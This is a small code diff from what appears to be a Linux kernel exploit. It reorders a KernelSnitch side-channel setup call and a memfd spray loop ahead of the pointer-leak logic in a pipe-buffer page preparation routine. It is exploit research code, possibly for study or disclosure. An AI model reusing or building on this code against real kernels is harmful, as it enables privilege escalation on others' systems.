@@ -126,6 +126,15 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     spray.memfds[i] = clone_memfd();
   }
 
+#if MM_SEARCH_MODE != 2
+  setup_kernelsnitch();
+#endif
+
+  for (size_t i = 0; i < pre.mm_cnt; i++) {
+    pre.childs[i] = -1;
+    pre.memfds[i] = clone_memfd();
+  }
+
   uintptr_t leaked = 0;
   int leak_memfd = -1;
 #if MM_SEARCH_MODE == 2
@@ -142,14 +151,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     return 0;
   }
 #else
-  setup_kernelsnitch();
-#endif
-
-  for (size_t i = 0; i < pre.mm_cnt; i++) {
-    pre.childs[i] = -1;
-    pre.memfds[i] = clone_memfd();
-  }
-#if MM_SEARCH_MODE != 2
   pid_t leak_child = clone_leak_child();
 #endif
   for (size_t i = 0; i < post.mm_cnt; i++) {
